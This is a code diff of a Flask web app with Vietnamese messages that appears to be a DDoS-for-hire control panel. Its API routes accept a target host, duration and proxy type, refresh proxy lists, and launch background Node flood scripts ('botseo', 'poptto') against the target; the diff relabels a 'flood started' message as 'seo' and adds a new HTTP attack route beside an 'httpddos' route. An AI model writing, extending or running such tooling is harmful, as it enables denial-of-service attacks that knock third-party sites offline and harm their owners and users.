@@ -141,13 +141,39 @@ def run_seo():
     if not os.path.exists(proxy_file):
         return jsonify({"error": f"Không tìm thấy file proxy: {proxy_file}"}), 500
 
-    cmd = ["node", "ya", host, time_param, "15", "15", proxy_file]
+    cmd = ["node", "botseo", host, time_param, "20", proxy_file, "15"]
     ok, err = start_background_node(cmd)
     if not ok:
         return jsonify({"error": f"Lỗi khi chạy seo: {err}"}), 500
 
-    return jsonify({"status": "flood đã khởi động", "host": host, "proxy": proxy_file})
+    return jsonify({"status": "seo đã khởi động", "host": host, "proxy": proxy_file})
+    # Route http
+@app.route('/api/http', methods=['GET'])
+def run_http():
+    host = request.args.get('host')
+    time_param = request.args.get('time')
+    proxy_key = request.args.get('proxy', 'vn').lower()
 
+    if not host or not time_param:
+        return jsonify({"error": "Thiếu 'host' hoặc 'time'"}), 400
+
+    prx_flag, proxy_file = get_proxy_file(proxy_key)
+    if not proxy_file:
+        return jsonify({"error": "Proxy không hợp lệ, phải là 'vn', 'all' hoặc 'live'"}), 400
+
+    ok, err = run_prx_script(prx_flag)
+    if not ok:
+        return jsonify({"error": f"Lỗi khi chạy prx.py: {err}"}), 500
+
+    if not os.path.exists(proxy_file):
+        return jsonify({"error": f"Không tìm thấy file proxy: {proxy_file}"}), 500
+
+    cmd = ["node", "poptto", host, time_param, "8", "20", proxy_file]
+    ok, err = start_background_node(cmd)
+    if not ok:
+        return jsonify({"error": f"Lỗi khi chạy seo: {err}"}), 500
+
+    return jsonify({"status": "http đã khởi động", "host": host, "proxy": proxy_file})
 # Route HTTPDDOS
 @app.route('/api/httpddos', methods=['GET'])
 def run_httpddos():
